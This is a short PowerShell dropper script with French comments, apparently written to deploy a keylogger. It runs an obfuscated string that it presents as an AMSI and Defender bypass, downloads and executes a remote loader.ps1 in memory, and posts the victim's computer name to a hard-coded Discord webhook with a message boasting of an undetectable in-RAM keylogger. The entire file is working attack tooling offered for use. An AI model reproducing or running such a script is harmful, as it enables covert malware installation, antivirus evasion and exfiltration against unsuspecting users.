$webhook="https://discord.com/api/webhooks/1318280027363606589/FkAnJDBzgFUo3A7YeocKsc8PbojYTWuE0-_BTNn7SunjxTokeWNOVpHk_dN9Uh5XqrOW"

# Bypass AMSI + Defender realtime (obfusqué 2025)
IEX([char[]](46,97,109,115,105,85,116,105,108,115,46,65,109,115,105,73,110,105,116,70,97,105,108,101,100)|%{[char]$_})

# Exécute le loader en mémoire
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tonpseudo/payload/main/loader.ps1')

# Notif finale
try{(iwr $webhook -Method Post -Body (@{content="Keylogger 100% en RAM – indétectable sur $env:COMPUTERNAME"}|ConvertTo-Json) -ContentType 'application/json').Content}catch{}
